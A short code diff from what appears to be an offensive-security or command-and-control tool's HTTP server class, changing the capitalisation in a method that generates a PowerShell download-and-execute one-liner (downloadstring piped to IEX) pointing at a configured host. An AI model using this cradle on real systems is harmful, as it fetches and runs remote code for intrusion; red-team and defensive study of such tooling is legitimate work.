@@ -102,7 +102,7 @@ class HttpServer(Thread):
 
     def download_link_powershell(self, route):
         http_route = self.create_download_link(route)
-        return f"""(new-object system.net.webclient).downloadstring("{http_route}")|IEX"""
+        return f"""(new-object System.Net.Webclient).downloadstring("{http_route}")|IEX"""
 
     def create_download_link(self, route):
         ip_addr = AppConfig.get("default_ip_address")
